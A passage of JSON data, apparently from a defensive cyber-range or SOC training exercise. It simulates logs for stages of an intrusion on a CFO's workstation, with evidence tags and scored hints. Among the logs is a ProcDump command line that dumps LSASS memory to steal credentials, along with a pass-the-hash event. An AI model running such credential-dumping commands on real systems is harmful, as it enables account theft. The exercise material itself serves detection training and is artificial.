            "CommandLine": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent --config C:\\Users\\r.johnson\\AppData\\Roaming\\Microsoft\\config.dat",
            "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "MandatoryLabel": "S-1-16-8192"
          },
          "severity": "MEDIUM",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "svchost32.exe",
          "eventId": "4688",
          "timestamp": "2025-10-14T08:49:00Z",
          "isEvidence": true,
          "evidenceTag": "renamed-binary-execution",
          "sortOrder": 7
        }
      ],
      "hints": [
        {
          "content": "Look at the EDR alert's binaryAnalysis section. The file is named 'svchost32.exe' but the original filename in the PE header is 'beacon_x64.exe' \u2014 a strong indicator of a Cobalt Strike or similar C2 implant.",
          "pointsPenalty": 3,
          "sortOrder": 1
        },
        {
          "content": "The attacker used TWO persistence mechanisms: a Registry Run key (HKCU\\...\\Run\\WindowsSecurityUpdate) and a scheduled task (MicrosoftEdgeUpdateCore). Both names are designed to look legitimate. This redundancy is a hallmark of APT operations.",
          "pointsPenalty": 3,
          "sortOrder": 2
        },
        {
          "content": "The network flow log shows a beaconing score of 0.97 (nearly perfect regularity) with 60-second intervals. Legitimate applications rarely maintain such precise timing. This jitter-free pattern is a classic C2 detection indicator.",
          "pointsPenalty": 5,
          "sortOrder": 3
        }
      ]
    },
    {
      "stageNumber": 3,
      "title": "Privilege Escalation & Credential Theft",
      "description": "With a stable foothold on the CFO's workstation, the attacker escalates privileges and dumps credentials from LSASS memory. The stolen domain admin NTLM hash will enable the next phase of lateral movement.",
      "unlockCondition": "AFTER_PREVIOUS",
      "logs": [
        {
          "logType": "WINDOWS_EVENT",
          "summary": "Windows Event 4672 \u2014 Special privileges assigned to new logon for r.johnson on WS-EXEC01. SeDebugPrivilege was granted, which allows debugging other processes \u2014 a prerequisite for dumping LSASS memory.",
          "rawLog": {
            "EventID": 4672,
            "Source": "Microsoft-Windows-Security-Auditing",
            "TimeCreated": "2025-10-14T10:12:44Z",
            "Computer": "WS-EXEC01.corpsec.local",
            "SubjectUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1142",
            "SubjectUserName": "r.johnson",
            "SubjectDomainName": "CORPSEC",
            "SubjectLogonId": "0x3E7A1B",
            "PrivilegeList": "SeDebugPrivilege\n\t\tSeImpersonatePrivilege\n\t\tSeBackupPrivilege\n\t\tSeRestorePrivilege\n\t\tSeTakeOwnershipPrivilege"
          },
          "severity": "HIGH",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "eventId": "4672",
          "timestamp": "2025-10-14T10:12:44Z",
          "isEvidence": true,
          "evidenceTag": "sedebugprivilege-assigned",
          "sortOrder": 1
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event 10 \u2014 Process accessed: svchost32.exe (PID 9104) accessed lsass.exe (PID 672) with PROCESS_VM_READ access rights on WS-EXEC01. This is a direct indicator of credential dumping from LSASS memory.",
          "rawLog": {
            "EventID": 10,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-10-14T10:12:48Z",
            "SourceProcessGUID": "{c3d4e5f6-a7b8-9012-cdef-012345678901}",
            "SourceProcessId": 9104,
            "SourceThreadId": 7856,
            "SourceImage": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
            "TargetProcessGUID": "{00000000-0000-0000-0000-000000000672}",
            "TargetProcessId": 672,
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9D4C4|C:\\Windows\\System32\\KERNELBASE.dll+2C13E|C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe+5A210",
            "SourceUser": "CORPSEC\\r.johnson",
            "TargetUser": "NT AUTHORITY\\SYSTEM"
          },
          "severity": "CRITICAL",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "svchost32.exe",
          "eventId": "10",
          "timestamp": "2025-10-14T10:12:48Z",
          "isEvidence": true,
          "evidenceTag": "lsass-memory-access",
          "sortOrder": 2
        },
        {
          "logType": "EDR_ALERT",
          "summary": "EDR Alert (CRITICAL) \u2014 Credential theft tool detected. Process svchost32.exe on WS-EXEC01 accessed LSASS memory with read permissions. Behavioral analysis matches known credential dumping techniques (Mimikatz-style). MITRE T1003.001.",
          "rawLog": {
            "alertId": "EDR-2025-18751",
            "severity": "CRITICAL",
            "timestamp": "2025-10-14T10:12:49Z",
            "hostname": "WS-EXEC01",
            "username": "r.johnson",
            "processName": "svchost32.exe",
            "processPath": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
            "alertType": "Credential Dumping - LSASS Memory Access",
            "detectionRule": "CRED_DUMP_LSASS_ACCESS",
            "mitreTactic": "Credential Access",
            "mitreTechnique": "T1003.001",
            "riskScore": 98,
            "targetProcess": "lsass.exe",
            "targetPid": 672,
            "accessMask": "0x1010 (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ)",
            "action": "ALERT_ONLY",
            "credentialsAtRisk": [
              "CORPSEC\\r.johnson (local cached)",
              "CORPSEC\\admin.rjohnson (domain admin, cached)",
              "CORPSEC\\svc-backup (service account, cached)",
              "CORPSEC\\administrator (local admin)"
            ],
            "recommendation": "Isolate host immediately. Reset all cached credentials."
          },
          "severity": "CRITICAL",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "svchost32.exe",
          "timestamp": "2025-10-14T10:12:49Z",
          "isEvidence": true,
          "evidenceTag": "edr-credential-theft-alert",
          "sortOrder": 3
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event 1 \u2014 Process creation: svchost32.exe spawned procdump64.exe targeting lsass.exe on WS-EXEC01. The attacker is using Sysinternals ProcDump to create a memory dump of LSASS for offline credential extraction.",
          "rawLog": {
            "EventID": 1,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-10-14T10:13:02Z",
            "ProcessGuid": "{d4e5f6a7-b8c9-0123-defa-123456789012}",
            "ProcessId": 10248,
            "Image": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\procdump64.exe",
            "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\r.johnson\\AppData\\Local\\Temp\\debug.dmp",
            "CurrentDirectory": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\",
            "User": "CORPSEC\\r.johnson",
            "LogonGuid": "{a1b2c3d4-0001-0002-0003-000000000001}",
            "LogonId": "0x3E7A1B",
            "IntegrityLevel": "High",
            "Hashes": "SHA256=7b4b1c7e2f19a6f31d2c2b3a4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e",
            "ParentProcessGuid": "{c3d4e5f6-a7b8-9012-cdef-012345678901}",
            "ParentProcessId": 9104,
            "ParentImage": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
            "ParentCommandLine": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent --config C:\\Users\\r.johnson\\AppData\\Roaming\\Microsoft\\config.dat"
          },
          "severity": "CRITICAL",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "procdump64.exe",
          "eventId": "1",
          "timestamp": "2025-10-14T10:13:02Z",
          "isEvidence": true,
          "evidenceTag": "procdump-lsass-dump",
          "sortOrder": 4
        },
        {
          "logType": "WINDOWS_EVENT",
          "summary": "Windows Event 4648 \u2014 Explicit credential logon: A logon was attempted using explicit credentials on WS-EXEC01. The process svchost32.exe used the NTLM hash of domain admin account 'admin.rjohnson' to authenticate. This indicates Pass the Hash activity.",
          "rawLog": {
            "EventID": 4648,
            "Source": "Microsoft-Windows-Security-Auditing",
            "TimeCreated": "2025-10-14T10:22:15Z",
            "Computer": "WS-EXEC01.corpsec.local",
            "SubjectUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1142",
            "SubjectUserName": "r.johnson",
            "SubjectDomainName": "CORPSEC",
            "SubjectLogonId": "0x3E7A1B",
            "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
            "TargetUserName": "admin.rjohnson",
            "TargetDomainName": "CORPSEC",
            "TargetLogonGuid": "{a1b2c3d4-9999-8888-7777-666655554444}",
            "TargetServerName": "SRV-FS01.corpsec.local",
            "TargetInfo": "SRV-FS01.corpsec.local",
            "ProcessId": "0x2390",
            "ProcessName": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
            "NetworkAddress": "10.0.3.10",
            "Port": 445
          },
          "severity": "CRITICAL",
          "hostname": "WS-EXEC01",
          "username": "r.johnson",
          "processName": "svchost32.exe",
          "sourceIp": "10.0.1.25",
          "destIp": "10.0.3.10",
          "eventId": "4648",
          "timestamp": "2025-10-14T10:22:15Z",
          "isEvidence": true,
          "evidenceTag": "pass-the-hash-attempt",
          "sortOrder": 5
        },
        {
          "logType": "SIEM_ALERT",
          "summary": "SIEM Correlation Alert (CRITICAL) \u2014 Privilege escalation chain detected on WS-EXEC01. Alert chain: SeDebugPrivilege assignment -> LSASS memory access -> procdump execution -> explicit credential logon with domain admin account. Full credential theft lifecycle observed in 10-minute window.",
          "rawLog": {
            "alertId": "SIEM-CORR-2025-4419",
            "ruleName": "Privilege Escalation and Credential Theft Chain",
            "severity": "CRITICAL",
            "timestamp": "2025-10-14T10:22:20Z",
            "description": "Correlated privilege escalation chain detected: debug privilege assignment followed by LSASS memory access, memory dump creation, and explicit credential logon using domain admin account",
            "correlatedEvents": [
              {
                "eventType": "Windows Event 4672",
                "description": "SeDebugPrivilege assigned to r.johnson",
                "timestamp": "2025-10-14T10:12:44Z"
              },
              {
                "eventType": "Sysmon Event 10",
                "description": "svchost32.exe accessed lsass.exe with VM_READ",
                "timestamp": "2025-10-14T10:12:48Z"
              },
              {
                "eventType": "Sysmon Event 1",
                "description": "procdump64.exe -ma lsass.exe executed",
                "timestamp": "2025-10-14T10:13:02Z"
              },
              {
                "eventType": "Windows Event 4648",
                "description": "Explicit logon as admin.rjohnson targeting SRV-FS01",
                "timestamp": "2025-10-14T10:22:15Z"
              }
            ],
            "affectedHost": "WS-EXEC01",
            "affectedUser": "r.johnson",
            "compromisedAccount": "admin.rjohnson (Domain Admin)",
            "timeWindow": "10 minutes",
            "dataSources": ["Windows Security", "Sysmon", "EDR"],
            "recommendation": "IMMEDIATE: Isolate WS-EXEC01, disable admin.rjohnson account, reset KRBTGT password twice"
          },
          "severity": "CRITICAL",
          "hostname": "SIEM-01",
          "username": "r.johnson",
          "timestamp": "2025-10-14T10:22:20Z",
          "isEvidence": true,
          "evidenceTag": "siem-credential-theft-chain",
          "sortOrder": 6
        }
      ],
      "hints": [
        {
          "content": "The Sysmon Event 10 log is the key evidence for credential dumping. GrantedAccess value 0x1010 corresponds to PROCESS_QUERY_INFORMATION | PROCESS_VM_READ \u2014 the minimum access rights needed to read process memory for credential extraction.",
          "pointsPenalty": 3,
          "sortOrder": 1
        },
        {
          "content": "The EDR alert reveals which credentials were cached on this machine: r.johnson, admin.rjohnson (domain admin!), svc-backup, and the local administrator. The domain admin credential is the attacker's highest-value target.",
          "pointsPenalty": 3,
          "sortOrder": 2
        },
        {
          "content": "Event 4648 shows the attacker used the stolen admin.rjohnson hash to authenticate to SRV-FS01 on port 445 (SMB). This is Pass the Hash (T1550.002) \u2014 they never needed the plaintext password, only the NTLM hash from the LSASS dump.",
          "pointsPenalty": 5,
          "sortOrder": 3
        }
      ]
    },
